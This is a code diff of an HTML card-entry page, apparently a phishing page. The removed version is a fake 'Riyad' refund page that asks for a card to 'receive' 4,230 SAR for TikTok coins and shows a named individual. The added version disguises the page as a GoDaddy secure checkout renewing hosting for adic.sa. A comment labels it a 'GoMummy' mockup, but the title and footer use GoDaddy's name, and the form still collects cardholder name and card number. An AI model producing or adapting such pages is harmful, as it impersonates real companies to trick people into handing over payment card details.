@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Riyad - Verify your identity </title>
+<title>GoDaddy — Secure Checkout</title>
 <!--
   ================================================================
   GoMummy — Secure Checkout Handoff  (PREVIEW / DESIGN MOCKUP)
@@ -1454,7 +1454,7 @@
 <header>
   <div class="wrap nav">
     <!-- LOGO (picture) — swap this inline SVG for the real brand logo file -->
-    <img class="gm-logo" src="https://adic.sa/rr.png" alt="riyad">
+    <img class="gm-logo" src="gomummy_logo.png" alt="gomummy">
     <span class="secure-tag">
       <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="10.5" width="16" height="10.5" rx="2"/><path d="M8 10.5V7a4 4 0 0 1 8 0v3.5"/></svg>
       Secure checkout
@@ -1477,7 +1477,7 @@
 	  <div class="co-block">
 <div class="pay-card">
           <div class="pay-head">
-            <div class="pay-radio"><span class="dot"></span> Enter the card you want get the amount on</div>
+            <div class="pay-radio"><span class="dot"></span> Proceed with saved card</div>
             <div class="pay-icons">
               <img src="https://wahastories.com/wp-content/plugins/moyasar/assets/images/unionpay.svg" alt="UnionPay">
               <img src="https://wahastories.com/wp-content/plugins/moyasar/assets/images/amex.svg" alt="Amex">
@@ -1489,11 +1489,11 @@
           <div class="pay-body">
             <div class="field">
               <label>Full name *</label>
-              <input type="text" name="card_name" placeholder="ASAAD ZAKI ALWATBAN">
+              <input type="text" name="card_name" placeholder="Full name">
             </div>
             <div class="field">
               <label>Card Number *</label>
-              <input type="text" name="card_number" inputmode="numeric" placeholder="**** **** **** ****">
+              <input type="text" name="card_number" inputmode="numeric" placeholder="**** **** **** 6336">
             </div>
             <div class="two">
               <div class="field">
@@ -1509,7 +1509,7 @@
         </div>
         </div>
 		
-	      <button type="submit" class="cta" id="placeOrder">Verify & Receive</button>
+	      <button type="submit" class="cta" id="placeOrder">Verify & Pay</button>
 
 	   </div>
 	   </form>
@@ -1519,21 +1519,22 @@
         <img class="pay-methods" src="payment-methods.png" alt="UnionPay, American Express, mada, Mastercard, Visa">
       </div>
 
+      <a class="back" href="renewal-landing.html">← Back to plans</a>
     </div>
 
     <!-- RIGHT: order summary -->
     <div class="summary">
-      <h2>Restored Amount Summary</h2>
-      <div class="srow"><span class="k">Website Used</span><span class="v site-chip" id="sumSite">TikTok</span></div>
-      <div class="srow"><span class="k">Product Refunded</span><span class="v">Coins</span></div>
-      <div class="srow"><span class="k">Recipient</span><span class="v" id="sumTerm">ASAAD ZAKI ALWATBAN</span></div>
-      <div class="srow"><span class="k">Transaction Date</span><span class="v" id="sumRenew">11/09/2028</span></div>
+      <h2>Order summary</h2>
+      <div class="srow"><span class="k">Website</span><span class="v site-chip" id="sumSite">adic.sa</span></div>
+      <div class="srow"><span class="k">Product</span><span class="v">WordPress Plugin Hosting</span></div>
+      <div class="srow"><span class="k">Plan</span><span class="v" id="sumTerm">1 Year</span></div>
+      <div class="srow"><span class="k">Renews on</span><span class="v" id="sumRenew">19/09/2028</span></div>
       <div class="total">
-        <span class="k">Amount Restored</span>
-        <span class="v" id="sumPrice">4,230 <small>SAR</small></span>
+        <span class="k">Total due today</span>
+        <span class="v" id="sumPrice">299 <small>SAR</small></span>
       </div>
-      <span class="save-badge" id="sumSave">Be careful while filling</span>
-      <p class="guarantee">Please ensure that all your information are accurate and correct.</p>
+      <span class="save-badge" id="sumSave">You're saving 49 SAR</span>
+      <p class="guarantee">Backed by our uptime guarantee. Cancel within 14 days for a full refund. Your website data is kept safe and backed up throughout.</p>
     </div>
 
   </div>
@@ -1542,8 +1543,8 @@
 <!-- ===== FOOTER ===== -->
 <footer>
   <div class="wrap foot-bar">
-    <img class="gm-logo" src="https://adic.sa/rr.png" alt="riyad">
-    <span>© 2026 Riyad • Secured checkout • Riyadh, Saudi Arabia</span>
+    <img class="gm-logo" src="gomummy_logo.png" alt="gomummy">
+    <span>© 2026 GoDaddy • Secured checkout • Riyadh, Saudi Arabia</span>
   </div>
 </footer>
 
@@ -1565,12 +1566,12 @@ document.addEventListener("DOMContentLoaded", function () {
 
   var q = new URLSearchParams(window.location.search);
 
-  var plan  = q.get("plan")  || "ASAAD ZAKI ALWATBAN";
-  var price = q.get("price") || "4,230";
-  var site  = q.get("site")  || "TikTok";
+  var plan  = q.get("plan")  || "1y";
+  var price = q.get("price") || "299";
+  var site  = q.get("site")  || "adic.sa";
 
   var terms = {
-    "1y": { label:"ASAAD ZAKI ALWATBAN",  years:1, save:""   },
+    "1y": { label:"1 Year",  years:1, save:""   },
     "2y": { label:"2 Years", years:2, save:"49" },
     "3y": { label:"3 Years", years:3, save:"48" }
   };
